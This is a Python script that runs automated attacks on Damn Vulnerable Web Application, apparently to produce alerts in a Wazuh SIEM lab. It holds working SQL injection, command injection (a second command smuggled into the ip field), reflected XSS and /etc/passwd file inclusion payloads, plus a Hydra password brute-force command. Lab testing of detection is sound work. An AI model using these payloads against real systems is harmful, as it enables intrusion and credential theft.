#!/usr/bin/env python3

import os
import requests
from time import sleep

def main():
    print("=== DVWA Automated Attack Script ===")
    dvwa_ip = input("Enter the DVWA IP address: ").strip()
    base_url = f"http://{dvwa_ip}/vulnerabilities"

    # Use default credentials
    login_url = f"http://{dvwa_ip}/login.php"
    session = requests.Session()

    login_data = {'username': 'admin', 'password': 'password', 'Login': 'Login'}
    resp = session.post(login_url, data=login_data)
    if "Login failed" in resp.text:
        print("[!] Login failed. Check credentials or IP.")
        return
    print("[*] Logged in successfully.")

    # 1. SQL Injection (Reflected)
    print("[*] Testing SQL Injection...")
    sql_url = f"{base_url}/sqli/"
    sql_payload = {"id": "1' OR '1'='1", "Submit": "Submit"}
    sql_resp = session.get(sql_url, params=sql_payload)
    if "First name" in sql_resp.text:
        print("[+] SQL Injection successful.")
    else:
        print("[-] SQL Injection may have failed.")

    # 2. Command Injection
    print("[*] Testing Command Injection...")
    cmdinj_url = f"{base_url}/exec/"
    cmdinj_payload = {"ip": "127.0.0.1; whoami", "Submit": "Submit"}
    cmdinj_resp = session.post(cmdinj_url, data=cmdinj_payload)
    if "uid=" in cmdinj_resp.text or "www-data" in cmdinj_resp.text:
        print("[+] Command Injection successful.")
    else:
        print("[-] Command Injection may have failed.")

    # 3. XSS (Reflected)
    print("[*] Testing XSS Reflected...")
    xss_url = f"{base_url}/xss_r/"
    xss_payload = {"name": "<script>alert('XSS')</script>", "Submit": "Submit"}
    xss_resp = session.get(xss_url, params=xss_payload)
    if "<script>alert('XSS')</script>" in xss_resp.text:
        print("[+] XSS Reflected payload reflected.")
    else:
        print("[-] XSS Reflected payload not reflected.")

    # 4. File Inclusion (LFI)
    print("[*] Testing File Inclusion...")
    fi_url = f"{base_url}/fi/"
    fi_payload = {"page": "../../../../etc/passwd"}
    fi_resp = session.get(fi_url, params=fi_payload)
    if "root:x:" in fi_resp.text:
        print("[+] File Inclusion successful.")
    else:
        print("[-] File Inclusion may have failed.")

    # 5. Brute Force with Hydra (requires system call)
    print("[*] Performing brute force using Hydra...")
    hydra_cmd = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {dvwa_ip} http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -t 4 -f > hydra_brute_force.txt"
    print(f"[!] Running Hydra with command: {hydra_cmd}")
    os.system(hydra_cmd)
    print("[+] Hydra brute force completed. Check hydra_brute_force.txt for results.")

    print("=== Automated Testing Completed ===")
    print("Note: This script will generate detectable logs in Wazuh for SIEM analysis.")

if __name__ == "__main__":
    main()
